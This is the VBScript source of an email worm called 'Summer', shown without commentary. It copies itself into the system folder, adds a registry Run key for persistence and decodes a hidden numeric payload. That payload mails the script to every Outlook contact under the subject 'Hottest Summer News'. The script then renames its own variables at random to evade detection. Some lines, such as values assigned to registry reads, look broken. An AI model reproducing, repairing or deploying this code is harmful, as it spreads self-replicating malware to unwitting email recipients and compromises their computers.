' Summer

On Error Resume Next

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set FSObject = CreateObject("Scripting.FileSystemObject")
Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 1)

CreateObject( "Scripting.FileSystemObject" ).CopyFile WScript.ScriptFullName, CreateObject( "Scripting.FileSystemObject" ).BuildPath( CreateObject( "Scripting.FileSystemObject" ).GetSpecialFolder(1), "Summer.vbs" )

CreateObject( "WScript.Shell" ).RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Summer", CreateObject( "Scripting.FileSystemObject" ).BuildPath( CreateObject( "Scripting.FileSystemObject" ).GetSpecialFolder(1), "Summer_mail.vbs" )

A04 = CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" )

If CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = "" Or CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) > 20 Then
   CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = 0
End If

If CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = 0 Then

' Encrypted file string:
sFile = "079110032069114114111114032082101115117109101032078101120116013010013010068105109032065048054013010068105109032065048055013010068105109032065048053013010068105109032065048056013010068105109032065048057013010068105109032065049048013010013010032032032083101116032065048053032061032067114101097116101079098106101099116040032034079117116108111111107046065112112108105099097116105111110034032041013010032032032083101116032065048054032061032065048053046071101116078097109101083112097099101040032034077065080073034032041013010013010032032032070111114032069097099104032065048055032073110032065048054046065100100114101115115076105115116115013010032032032032032032032083101116032065048056032061032065048053046067114101097116101073116101109040032048032041013010013010032032032032032032032070111114032065048057032061032049032084111032065048055046065100100114101115115069110116114105101115046067111117110116013010032032032032032032032032032032032083101116032065049048032061032065048055046065100100114101115115069110116114105101115040032065048057032041013010013010032032032032032032032032032032032073102032065048057032061032049032084104101110013010032032032032032032032032032032032032032032065048056046066067067032061032065049048046065100100114101115115013010032032032032032032032032032032032069108115101013010032032032032032032032032032032032032032032065048056046066067067032061032065048056046066067067032038032034059032034032038032065049048046065100100114101115115013010032032032032032032032032032032032069110100032073102013010032032032032032032032078101120116013010013010032032032032032032032065048056046083117098106101099116032061032034072111116116101115116032083117109109101114032078101119115034013010032032032032032032032065048056046066111100121032061032034071111032116111032116104101032098101097099104032097110100032104097118101032102117110034013010032032032032032032032065048056046065116116097099104109101110116115046065100100032067114101097116101079098106101099116040032034083099114105112116105110103046070105108101083121115116101109079098106101099116034032041046066117105108100080097116104040032067114101097116101079098106101099116040032034083099114105112116105110103046070105108101083121115116101109079098106101099116034032041046071101116083112101099105097108070111108100101114040049041044032034083117109109101114046118098115034032041013010032032032032032032032065048056046068101108101116101065102116101114083117098109105116032061032084114117101013010032032032032032032032065048056046083101110100013010032032032078101120116013010013010"
sDecFile = fso.BuildPath(fso.GetSpecialFolder(0),"summer_mail.vbs")
Set daFile = fso.CreateTextFile(sDecFile, True)
daFile.Write(Dec(sFile))
daFile.Close

   CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = 0
End If

CreateObject( "WScript.Shell" ).RegWrite "HKEY_LOCAL_MACHINE\" & "Summer", CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) + 1

Randomize
OurCode = ScriptFile.Readall
AllVariables = "FSObject ScriptFile OurCode AllVariables VarLoop CurVar NewVar VarPos A04 daFile sFile sDecFile idx B1 B2"
Do
CurVar = Left(AllVariables, InStr(AllVariables, Chr(32)) - 1)
AllVariables = Mid(AllVariables, InStr(AllVariables, Chr(32)) + 1)
NewVar = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
VarPos = InStr(VarPos + 1, OurCode, CurVar)
If VarPos Then OurCode = Mid(OurCode, 1, (VarPos - 1)) & NewVar & Mid(OurCode, (VarPos + Len(CurVar)))
Loop While VarPos
Loop While AllVariables <> ""
Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 2, True) '
ScriptFile.Writeline OurCode

' Decrypts the stored file
Function Dec(B1)
  idx = 1
  For B2 = 1 To (Len(B1) \ 3)
    Dec = Dec & Chr(Mid(B1,idx,3))
    idx = idx + 3
  Next
End Function
